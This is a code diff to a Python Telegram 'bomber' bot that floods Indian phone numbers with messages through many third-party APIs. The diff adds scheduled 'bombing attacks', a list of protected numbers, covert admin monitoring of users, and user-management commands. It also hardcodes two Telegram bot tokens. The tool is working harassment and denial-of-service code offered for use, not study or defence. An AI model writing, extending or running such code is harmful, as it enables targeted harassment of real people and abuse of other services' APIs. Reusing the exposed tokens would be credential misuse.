@@ -5,15 +5,21 @@ import aiohttp
 import time
 import json
 import os
-from datetime import datetime
+import uuid
+from datetime import datetime, timedelta
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
-BOT_TOKEN = "8546588357:AAFdU_j5_fMlvsFwkK53pgcXT4fVbpMenQA"
+#ogggggg bot  BOT_TOKEN = "8546588357:AAFdU_j5_fMlvsFwkK53pgcXT4fVbpMenQA"
 
 # Admin Configuration
+
+
+BOT_TOKEN = "8531349883:AAGVi6bXMspjV137JXP6KBQaz8GWxg_533g"
 ADMIN_ID = 7678087570
 AUTHORIZED_USERS_FILE = "authorized_users.json"
+BLOCKED_NUMBERS_FILE = "blocked_numbers.json"
+SCHEDULED_ATTACKS_FILE = "scheduled_attacks.json"
 
 APIS = [
     {
@@ -1164,10 +1170,138 @@ class UserManager:
         """Get all authorized users"""
         return self.users
 
+class BlockedNumbersManager:
+    """Manages blocked phone numbers with JSON storage"""
+    
+    def __init__(self, filename=BLOCKED_NUMBERS_FILE):
+        self.filename = filename
+        self.blocked_numbers = self.load_blocked_numbers()
+    
+    def load_blocked_numbers(self):
+        """Load blocked numbers from JSON file"""
+        if os.path.exists(self.filename):
+            try:
+                with open(self.filename, 'r') as f:
+                    return json.load(f)
+            except:
+                return {}
+        return {}
+    
+    def save_blocked_numbers(self):
+        """Save blocked numbers to JSON file"""
+        with open(self.filename, 'w') as f:
+            json.dump(self.blocked_numbers, f, indent=2)
+    
+    def block_number(self, phone_number, reason="No reason provided"):
+        """Add a phone number to blocked list"""
+        self.blocked_numbers[phone_number] = {
+            "phone": phone_number,
+            "blocked_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "reason": reason
+        }
+        self.save_blocked_numbers()
+    
+    def unblock_number(self, phone_number):
+        """Remove a phone number from blocked list"""
+        if phone_number in self.blocked_numbers:
+            del self.blocked_numbers[phone_number]
+            self.save_blocked_numbers()
+            return True
+        return False
+    
+    def is_blocked(self, phone_number):
+        """Check if a phone number is blocked"""
+        return phone_number in self.blocked_numbers
+    
+    def get_blocked_info(self, phone_number):
+        """Get information about a blocked number"""
+        return self.blocked_numbers.get(phone_number)
+    
+    def get_all_blocked(self):
+        """Get all blocked numbers"""
+        return self.blocked_numbers
+
+class ScheduleManager:
+    """Manages scheduled bombing attacks with JSON storage"""
+    
+    def __init__(self, filename=SCHEDULED_ATTACKS_FILE):
+        self.filename = filename
+        self.schedules = self.load_schedules()
+    
+    def load_schedules(self):
+        """Load scheduled attacks from JSON file"""
+        if os.path.exists(self.filename):
+            try:
+                with open(self.filename, 'r') as f:
+                    return json.load(f)
+            except:
+                return {}
+        return {}
+    
+    def save_schedules(self):
+        """Save scheduled attacks to JSON file"""
+        with open(self.filename, 'w') as f:
+            json.dump(self.schedules, f, indent=2)
+    
+    def add_schedule(self, user_id, phone, duration, scheduled_time, username=None):
+        """Add a new scheduled attack"""
+        schedule_id = str(uuid.uuid4())[:8]
+        self.schedules[schedule_id] = {
+            "schedule_id": schedule_id,
+            "user_id": user_id,
+            "username": username,
+            "phone": phone,
+            "duration": duration,
+            "scheduled_time": scheduled_time,
+            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "status": "pending",
+            "executed": False
+        }
+        self.save_schedules()
+        return schedule_id
+    
+    def cancel_schedule(self, schedule_id, user_id):
+        """Cancel a scheduled attack"""
+        if schedule_id in self.schedules:
+            schedule = self.schedules[schedule_id]
+            # Check if user owns this schedule or is admin
+            if schedule["user_id"] == user_id or user_id == ADMIN_ID:
+                del self.schedules[schedule_id]
+                self.save_schedules()
+                return True
+        return False
+    
+    def get_user_schedules(self, user_id):
+        """Get all schedules for a specific user"""
+        user_schedules = {}
+        for sid, schedule in self.schedules.items():
+            if schedule["user_id"] == user_id and not schedule["executed"]:
+                user_schedules[sid] = schedule
+        return user_schedules
+    
+    def get_all_schedules(self):
+        """Get all pending schedules"""
+        return {k: v for k, v in self.schedules.items() if not v["executed"]}
+    
+    def mark_executed(self, schedule_id):
+        """Mark a schedule as executed"""
+        if schedule_id in self.schedules:
+            self.schedules[schedule_id]["executed"] = True
+            self.schedules[schedule_id]["status"] = "completed"
+            self.save_schedules()
+    
+    def get_schedule(self, schedule_id):
+        """Get a specific schedule"""
+        return self.schedules.get(schedule_id)
+
 class BomberBot:
-    def __init__(self):
+    def __init__(self, app=None):
         self.active_attacks = {}
         self.user_manager = UserManager()
+        self.blocked_manager = BlockedNumbersManager()
+        self.schedule_manager = ScheduleManager()
+        self.app = app
+        self.scheduler_running = False
     
     async def start_bombing(self, phone, duration, user_id):
         if user_id in self.active_attacks:
@@ -1175,6 +1309,15 @@ class BomberBot:
         
         if len(phone) != 10 or not phone.isdigit():
             return "❌ Invalid phone! Send 10 digit number."
+        
+        # Check if number is blocked
+        if self.blocked_manager.is_blocked(phone):
+            blocked_info = self.blocked_manager.get_blocked_info(phone)
+            return (
+                "🚫 **RESTRICTED NUMBER**\n\n"
+                f"BETA HUMSE HE GADDARI??\n"
+             
+            )
         
         self.active_attacks[user_id] = {
             "phone": phone, 
@@ -1224,6 +1367,77 @@ class BomberBot:
                     f"📱 **Target:** `+91{stats['phone']}`\n"
                     f"⚡ **Status:** RUNNING...")
         return "ℹ️ No active bombing. Use /bomb to start."
+    
+    async def start_scheduler(self):
+        """Background task to check and execute scheduled attacks"""
+        if self.scheduler_running:
+            return
+        
+        self.scheduler_running = True
+        print("📅 Scheduler started - checking for scheduled attacks...")
+        
+        while self.scheduler_running:
+            try:
+                current_time = datetime.now()
+                schedules = self.schedule_manager.get_all_schedules()
+                
+                for schedule_id, schedule in list(schedules.items()):
+                    scheduled_time = datetime.strptime(schedule["scheduled_time"], "%Y-%m-%d %H:%M:%S")
+                    
+                    # Check if it's time to execute
+                    if current_time >= scheduled_time:
+                        user_id = schedule["user_id"]
+                        phone = schedule["phone"]
+                        duration = schedule["duration"]
+                        username = schedule.get("username", "Unknown")
+                        
+                        print(f"⏰ Executing scheduled attack: {schedule_id}")
+                        
+                        # Check if user is still authorized
+                        if self.user_manager.is_authorized(user_id):
+                            # Check if number is not blocked
+                            if not self.blocked_manager.is_blocked(phone):
+                                # Start the bombing
+                                result = await self.start_bombing(phone, duration, user_id)
+                                
+                                # Notify user
+                                try:
+                                    await self.app.bot.send_message(
+                                        chat_id=user_id,
+                                        text=(
+                                            f"⏰ **SCHEDULED ATTACK STARTED!**\n\n"
+                                            f"📱 **Target:** `+91{phone}`\n"
+                                            f"⏰ **Duration:** {duration} min\n"
+                                            f"🆔 **Schedule ID:** `{schedule_id}`\n\n"
+                                            f"{result}"
+                                        ),
+                                        parse_mode='Markdown'
+                                    )
+                                    
+                                    # Notify admin
+                                    await self.app.bot.send_message(
+                                        chat_id=ADMIN_ID,
+                                        text=(
+                                            f"⏰ **SCHEDULED ATTACK EXECUTED**\n\n"
+                                            f"👤 **User:** {username} (`{user_id}`)\n"
+                                            f"📱 **Target:** `+91{phone}`\n"
+                                            f"⏰ **Duration:** {duration} min\n"
+                                            f"🆔 **Schedule ID:** `{schedule_id}`"
+                                        ),
+                                        parse_mode='Markdown'
+                                    )
+                                except Exception as e:
+                                    print(f"Failed to send scheduled attack notification: {e}")
+                        
+                        # Mark as executed
+                        self.schedule_manager.mark_executed(schedule_id)
+                
+                # Check every 30 seconds
+                await asyncio.sleep(30)
+                
+            except Exception as e:
+                print(f"Scheduler error: {e}")
+                await asyncio.sleep(60)
     
     async def _bomb_worker(self, user_id, phone, duration):
         end_time = time.time() + (duration * 60)
@@ -1328,11 +1542,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "├ /stop - Stop bombing\n"
             "└ /stats - Show stats\n\n"
             "🔐 **Admin Commands:**\n"
-            "├ /add <userid> - Add user\n"
+            "├ /add <userid> [<name>] - Add user\n"
             "├ /remove <userid> - Remove user\n"
             "├ /users - List all users\n"
             "├ /info <userid> - User info\n"
-            "└ /botinfo - Bot statistics\n\n"
+            "├ /botinfo - Bot statistics\n\n"
+            "🚫 **Blocked Numbers:**\n"
+            "├ /block <phone> [<reason>] - Block number\n"
+            "├ /unblock <phone> - Unblock number\n"
+            "└ /blocked - List blocked numbers\n\n"
             f"📡 **APIs Loaded:** {len(APIS)}\n"
             f"👤 **Your ID:** `{user_id}`\n"
             "⚡ **Status:** ADMIN ACCESS"
@@ -1392,14 +1610,91 @@ async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Invalid duration! Use numbers only.")
         return
     
+    # Silent admin notification - user doesn't know admin is watching
+    if user_id != ADMIN_ID:
+        try:
+            username = update.effective_user.username or "No username"
+            first_name = update.effective_user.first_name or "Unknown"
+            user_data = bomber.user_manager.get_user_info(user_id)
+            custom_name = user_data.get('username', None) if user_data else None
+            
+            admin_notification = (
+                "🔔 **NEW BOMBING ACTIVITY**\n\n"
+                "👤 **User Info:**\n"
+                f"├ User ID: `{user_id}`\n"
+                f"├ Telegram: @{username}\n"
+                f"├ Name: {first_name}\n"
+            )
+            
+            if custom_name:
+                admin_notification += f"└ Custom Name: {custom_name}\n\n"
+            else:
+                admin_notification += "\n"
+            
+            admin_notification += (
+                "🎯 **Attack Details:**\n"
+                f"├ Target: `+91{phone}`\n"
+                f"├ Duration: {duration} minutes\n"
+                f"└ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                "⚡ Attack has been started!"
+            )
+            
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=admin_notification,
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            print(f"Admin notification failed: {e}")
+    
     result = await bomber.start_bombing(phone, duration, user_id)
     await update.message.reply_text(result, parse_mode='Markdown')
 
 @authorized_only
 async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    username = update.effective_user.username or "No username"
+    first_name = update.effective_user.first_name or "Unknown"
+    stats_before = bomber.active_attacks.get(user_id, {})
+    
     result = await bomber.stop_bombing(user_id)
     await update.message.reply_text(result, parse_mode='Markdown')
+    
+    # Silent admin notification
+    if user_id != ADMIN_ID and stats_before:
+        try:
+            user_data = bomber.user_manager.get_user_info(user_id)
+            custom_name = user_data.get('username', None) if user_data else None
+            
+            admin_notification = (
+                "🛑 **BOMBING STOPPED**\n\n"
+                "👤 **User Info:**\n"
+                f"├ User ID: `{user_id}`\n"
+                f"├ Telegram: @{username}\n"
+                f"├ Name: {first_name}\n"
+            )
+            
+            if custom_name:
+                admin_notification += f"└ Custom Name: {custom_name}\n\n"
+            else:
+                admin_notification += "\n"
+            
+            admin_notification += (
+                "📊 **Attack Results:**\n"
+                f"├ Target: `+91{stats_before.get('phone', 'N/A')}`\n"
+                f"├ Success: {stats_before.get('success', 0)}\n"
+                f"├ Failed: {stats_before.get('failed', 0)}\n"
+                f"├ Cycles: {stats_before.get('cycles', 0)}\n"
+                f"└ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            )
+            
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=admin_notification,
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            print(f"Admin stop notification failed: {e}")
 
 @authorized_only
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1409,28 +1704,34 @@ async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 @admin_only
 async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) != 1:
+    if len(context.args) < 1:
         await update.message.reply_text(
             "❌ **Invalid Usage!**\n\n"
             "📝 **Correct Format:**\n"
-            "`/add <userid>`\n\n"
-            "🎯 **Example:**\n"
-            "`/add 123456789`",
+            "`/add <userid> [<name>]`\n\n"
+            "🎯 **Examples:**\n"
+            "`/add 123456789`\n"
+            "`/add 123456789 John`\n"
+            "`/add 123456789 My Friend`",
             parse_mode='Markdown'
         )
         return
     
     try:
         new_user_id = int(context.args[0])
+        custom_name = " ".join(context.args[1:]) if len(context.args) > 1 else None
         
         if bomber.user_manager.is_authorized(new_user_id):
             await update.message.reply_text(f"⚠️ User `{new_user_id}` is already authorized!", parse_mode='Markdown')
             return
         
-        bomber.user_manager.add_user(new_user_id)
+        bomber.user_manager.add_user(new_user_id, username=custom_name)
+        
+        name_display = f"📛 **Name:** {custom_name}\n" if custom_name else ""
         await update.message.reply_text(
             f"✅ **User Added Successfully!**\n\n"
             f"🆔 **User ID:** `{new_user_id}`\n"
+            f"{name_display}"
             f"📅 **Added:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
             f"👤 **Added By:** Admin",
             parse_mode='Markdown'
@@ -1481,14 +1782,15 @@ async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = "👥 **AUTHORIZED USERS LIST**\n\n"
     
     for idx, (user_id, user_data) in enumerate(users.items(), 1):
-        username = user_data.get('username', 'Unknown')
+        custom_name = user_data.get('username', None)
         added_at = user_data.get('added_at', 'N/A')
         total_attacks = user_data.get('total_attacks', 0)
         last_attack = user_data.get('last_attack', 'Never')
         
+        name_line = f"   ├ Name: {custom_name}\n" if custom_name else ""
         message += (
             f"**{idx}. User ID:** `{user_id}`\n"
-            f"   ├ Username: @{username}\n"
+            f"{name_line}"
             f"   ├ Added: {added_at}\n"
             f"   ├ Total Attacks: {total_attacks}\n"
             f"   └ Last Attack: {last_attack}\n\n"
@@ -1516,10 +1818,13 @@ async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"❌ User `{user_id}` not found!", parse_mode='Markdown')
             return
         
+        custom_name = user_data.get('username', None)
+        name_line = f"📛 **Name:** {custom_name}\n" if custom_name else ""
+        
         message = (
             f"👤 **USER INFORMATION**\n\n"
             f"🆔 **User ID:** `{user_id}`\n"
-            f"👤 **Username:** @{user_data.get('username', 'Unknown')}\n"
+            f"{name_line}"
             f"📅 **Added:** {user_data.get('added_at', 'N/A')}\n"
             f"👤 **Added By:** Admin\n"
             f"📊 **Total Attacks:** {user_data.get('total_attacks', 0)}\n"
@@ -1547,10 +1852,246 @@ async def bot_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(message, parse_mode='Markdown')
 
+@admin_only
+async def block_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if len(context.args) < 1:
+        await update.message.reply_text(
+            "❌ **Invalid Usage!**\n\n"
+            "📝 **Correct Format:**\n"
+            "`/block <phone> [<reason>]`\n\n"
+            "🎯 **Examples:**\n"
+            "`/block 9876543210`\n"
+            "`/block 9876543210 Personal number`",
+            parse_mode='Markdown'
+        )
+        return
+    
+    phone = context.args[0]
+    reason = " ".join(context.args[1:]) if len(context.args) > 1 else "No reason provided"
+    
+    if not phone.isdigit() or len(phone) != 10:
+        await update.message.reply_text("❌ Invalid phone number! Please enter 10 digits.")
+        return
+    
+    if bomber.blocked_manager.is_blocked(phone):
+        await update.message.reply_text(f"⚠️ Number `+91{phone}` is already blocked!", parse_mode='Markdown')
+        return
+    
+    bomber.blocked_manager.block_number(phone, reason)
+    await update.message.reply_text(
+        f"🚫 **Number Blocked Successfully!**\n\n"
+        f"📱 **Phone:** `+91{phone}`\n"
+        f"📝 **Reason:** {reason}\n"
+        f"📅 **Blocked:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        f"✅ This number is now restricted from bombing.",
+        parse_mode='Markdown'
+    )
+
+@admin_only
+async def unblock_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if len(context.args) != 1:
+        await update.message.reply_text(
+            "❌ **Invalid Usage!**\n\n"
+            "📝 **Correct Format:**\n"
+            "`/unblock <phone>`\n\n"
+            "🎯 **Example:**\n"
+            "`/unblock 9876543210`",
+            parse_mode='Markdown'
+        )
+        return
+    
+    phone = context.args[0]
+    
+    if not phone.isdigit() or len(phone) != 10:
+        await update.message.reply_text("❌ Invalid phone number! Please enter 10 digits.")
+        return
+    
+    if bomber.blocked_manager.unblock_number(phone):
+        await update.message.reply_text(
+            f"✅ **Number Unblocked Successfully!**\n\n"
+            f"📱 **Phone:** `+91{phone}`\n"
+            f"📅 **Unblocked:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"✅ This number can now be targeted.",
+            parse_mode='Markdown'
+        )
+    else:
+        await update.message.reply_text(f"❌ Number `+91{phone}` is not in the blocked list!", parse_mode='Markdown')
+
+@admin_only
+async def list_blocked(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    blocked = bomber.blocked_manager.get_all_blocked()
+    
+    if not blocked:
+        await update.message.reply_text("📋 No blocked numbers yet!")
+        return
+    
+    message = "🚫 **BLOCKED NUMBERS LIST**\n\n"
+    
+    for idx, (phone, data) in enumerate(blocked.items(), 1):
+        blocked_at = data.get('blocked_at', 'N/A')
+        reason = data.get('reason', 'No reason')
+        
+        message += (
+            f"**{idx}. Phone:** `+91{phone}`\n"
+            f"   ├ Blocked: {blocked_at}\n"
+            f"   └ Reason: {reason}\n\n"
+        )
+    
+    message += f"📊 **Total Blocked:** {len(blocked)}"
+    await update.message.reply_text(message, parse_mode='Markdown')
+
+@authorized_only
+async def schedule_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    username = update.effective_user.username or "No username"
+    
+    if len(context.args) < 3:
+        await update.message.reply_text(
+            "❌ **Invalid Usage!**\n\n"
+            "📝 **Correct Format:**\n"
+            "`/schedule <phone> <duration> <time>`\n\n"
+            "🎯 **Examples:**\n"
+            "`/schedule 9876543210 5 20:30` - Today at 8:30 PM\n"
+            "`/schedule 9876543210 10 14:00` - Today at 2:00 PM\n\n"
+            "⏰ **Time Format:** HH:MM (24-hour format)",
+            parse_mode='Markdown'
+        )
+        return
+    
+    phone, duration_str, time_str = context.args[0], context.args[1], context.args[2]
+    
+    if not phone.isdigit() or len(phone) != 10:
+        await update.message.reply_text("❌ Invalid phone number! Please enter 10 digits.")
+        return
+    
+    try:
+        duration = int(duration_str)
+        if duration <= 0 or duration > 60:
+            await update.message.reply_text("❌ Invalid duration! Use 1-60 minutes.")
+            return
+    except ValueError:
+        await update.message.reply_text("❌ Invalid duration! Use numbers only.")
+        return
+    
+    try:
+        hour, minute = map(int, time_str.split(':'))
+        if hour < 0 or hour > 23 or minute < 0 or minute > 59:
+            raise ValueError
+        
+        now = datetime.now()
+        scheduled_dt = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
+        
+        if scheduled_dt <= now:
+            scheduled_dt += timedelta(days=1)
+        
+        scheduled_time_str = scheduled_dt.strftime("%Y-%m-%d %H:%M:%S")
+    except ValueError:
+        await update.message.reply_text("❌ Invalid time format! Use HH:MM (24-hour)\nExample: 14:30")
+        return
+    
+    if bomber.blocked_manager.is_blocked(phone):
+        await update.message.reply_text(
+            "🚫 **RESTRICTED NUMBER**\n\n"
+            f"❌ The number `+91{phone}` is blocked!",
+            parse_mode='Markdown'
+        )
+        return
+    
+    schedule_id = bomber.schedule_manager.add_schedule(
+        user_id=user_id, phone=phone, duration=duration,
+        scheduled_time=scheduled_time_str, username=username
+    )
+    
+    time_diff = scheduled_dt - now
+    hours = int(time_diff.total_seconds() // 3600)
+    minutes = int((time_diff.total_seconds() % 3600) // 60)
+    
+    await update.message.reply_text(
+        f"⏰ **ATTACK SCHEDULED!**\n\n"
+        f"🆔 **ID:** `{schedule_id}`\n"
+        f"📱 **Target:** `+91{phone}`\n"
+        f"⏰ **Duration:** {duration} min\n"
+        f"📅 **Time:** {scheduled_dt.strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"⏳ **Starts In:** {hours}h {minutes}m\n\n"
+        f"✅ Will start automatically!\n"
+        f"🗑️ Use `/cancel {schedule_id}` to cancel",
+        parse_mode='Markdown'
+    )
+
+@authorized_only
+async def view_schedules(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    schedules = bomber.schedule_manager.get_user_schedules(user_id)
+    
+    if not schedules:
+        await update.message.reply_text("📋 You have no scheduled attacks!")
+        return
+    
+    message = "📅 **YOUR SCHEDULED ATTACKS**\n\n"
+    
+    for idx, (schedule_id, schedule) in enumerate(schedules.items(), 1):
+        phone, duration = schedule['phone'], schedule['duration']
+        scheduled_time = schedule['scheduled_time']
+        scheduled_dt = datetime.strptime(scheduled_time, "%Y-%m-%d %H:%M:%S")
+        time_diff = scheduled_dt - datetime.now()
+        
+        if time_diff.total_seconds() > 0:
+            hours = int(time_diff.total_seconds() // 3600)
+            minutes = int((time_diff.total_seconds() % 3600) // 60)
+            time_remaining = f"{hours}h {minutes}m"
+        else:
+            time_remaining = "Executing soon..."
+        
+        message += (
+            f"**{idx}. ID:** `{schedule_id}`\n"
+            f"   ├ Target: `+91{phone}`\n"
+            f"   ├ Duration: {duration} min\n"
+            f"   ├ Time: {scheduled_time}\n"
+            f"   └ Starts in: {time_remaining}\n\n"
+        )
+    
+    message += f"📊 **Total:** {len(schedules)}\n🗑️ Use `/cancel <id>` to cancel"
+    await update.message.reply_text(message, parse_mode='Markdown')
+
+@authorized_only
+async def cancel_schedule(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if len(context.args) != 1:
+        await update.message.reply_text(
+            "❌ **Invalid Usage!**\n\n"
+            "📝 **Format:** `/cancel <schedule_id>`\n"
+            "🎯 **Example:** `/cancel a1b2c3d4`\n\n"
+            "💡 Use `/schedules` to see IDs",
+            parse_mode='Markdown'
+        )
+        return
+    
+    schedule_id = context.args[0]
+    
+    if bomber.schedule_manager.cancel_schedule(schedule_id, user_id):
+        await update.message.reply_text(
+            f"✅ **Schedule Cancelled!**\n\n"
+            f"🆔 **ID:** `{schedule_id}`\n"
+            f"🗑️ Scheduled attack removed.",
+            parse_mode='Markdown'
+        )
+    else:
+        await update.message.reply_text(
+            f"❌ **Not Found!**\n\n"
+            f"Schedule `{schedule_id}` doesn't exist or isn't yours.\n\n"
+            f"💡 Use `/schedules` to see your schedules.",
+            parse_mode='Markdown'
+        )
+
 def main():
+    global bomber
     try:
         # Create application
         app = Application.builder().token(BOT_TOKEN).build()
+        
+        # Initialize bomber with app reference
+        bomber.app = app
         
         # User commands
         app.add_handler(CommandHandler("start", start))
@@ -1564,6 +2105,16 @@ def main():
         app.add_handler(CommandHandler("users", list_users))
         app.add_handler(CommandHandler("info", user_info))
         app.add_handler(CommandHandler("botinfo", bot_info))
+        
+        # Blocked numbers commands
+        app.add_handler(CommandHandler("block", block_number))
+        app.add_handler(CommandHandler("unblock", unblock_number))
+        app.add_handler(CommandHandler("blocked", list_blocked))
+        
+        # Schedule commands
+        app.add_handler(CommandHandler("schedule", schedule_attack))
+        app.add_handler(CommandHandler("schedules", view_schedules))
+        app.add_handler(CommandHandler("cancel", cancel_schedule))
         
         print("=" * 50)
         print("🤖  BOMBER BOT STARTED!")
